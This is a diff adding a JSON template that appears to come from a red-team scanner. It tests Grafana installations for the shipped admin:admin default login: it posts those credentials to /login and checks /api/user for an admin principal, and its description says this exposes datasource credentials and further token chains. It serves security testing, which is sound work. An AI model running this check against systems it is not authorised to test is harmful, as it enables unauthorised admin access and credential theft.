@@ -1,0 +1,39 @@
+{
+  "name": "redteam/Grafana default credential login",
+  "description": "[adv] Grafana shipped admin:admin accepted (CWE-798; Grafana sign-in docs, signoz): login 200 then /api/user returns the admin principal — datasource credentials and the elite JWT/OAuth chains become reachable. Keywords: grafana default credentials admin login weak auth monitoring. ctrl: password-changed installs 401 the default pair -> not falsified. base_url = Grafana root.",
+  "cwe": "CWE-798",
+  "requests": {
+    "payload": {
+      "method": "POST",
+      "url": "{{base_url}}/login",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": "{\"user\":\"admin\",\"password\":\"admin\"}"
+    },
+    "check": {
+      "method": "GET",
+      "url": "{{base_url}}/api/user"
+    }
+  },
+  "conditions": [
+    {
+      "type": "status",
+      "request": "payload",
+      "equals": 200
+    },
+    {
+      "type": "body_regex",
+      "request": "check",
+      "pattern": "\"login\"\\s*:\\s*\"admin\""
+    }
+  ],
+  "params": [
+    "base_url"
+  ],
+  "source": "imported",
+  "successes": 1,
+  "id": "a042bc7b468d",
+  "created": "2026-11-06T00:00:00+00:00",
+  "last_used": "2026-11-06T00:00:00+00:00"
+}
